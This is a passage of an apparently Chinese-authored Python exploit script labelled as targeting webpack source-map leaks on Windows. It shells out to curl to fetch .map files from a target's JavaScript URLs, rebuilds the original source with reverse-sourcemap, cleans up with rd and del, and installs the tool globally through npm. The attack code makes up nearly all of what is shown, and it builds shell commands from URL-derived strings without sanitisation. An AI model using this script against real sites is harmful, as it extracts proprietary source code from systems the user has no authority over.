...
print('--------------------webpack源码泄露漏洞利用脚本(Windows)--------------------')
...
def webpack(getlist):
    try:
        ...
        for jslist in getlist:
            ...
            #print(js)
            curl = "{} && curl -O {}.map".format(file_name,jslist)
            command = "{} && reverse-sourcemap --output-dir ./{} {}.map".format(file_name,js,js_name)
            #subprocess.getstatusoutput返回值：返回是一个元组，如果成功，返回(0, 'xxx')；如果失败，返回(1, 'xxx')
            result1 = subprocess.getstatusoutput('%s' % (curl))
            result_curl.append(result1[0])
            if result1[0] == 0:                
                result2 = subprocess.getstatusoutput('%s' % (command))
                result_reverse_sourcemap.append(result2[0])
                if result2[0] == 1:
                    #print('reverse-sourcemap解析失败')
                    error_cs+=1 #工具解析失败次数+1
                    RM = subprocess.getstatusoutput('%s && rd /q /s %s' % (file_name,js)) #删除无法解析的文件夹
            else:
                RM = subprocess.getstatusoutput('%s && del %s.map' % (file_name,js_name)) #删除无法下载的文件
                pass
...
result_reverse_sourcemap_az= subprocess.getstatusoutput('reverse-sourcemap -h')
if result_reverse_sourcemap_az[0] == 0:
    pass
else:
    subprocess.getstatusoutput('%s' % ('npm install --global reverse-sourcemap'))
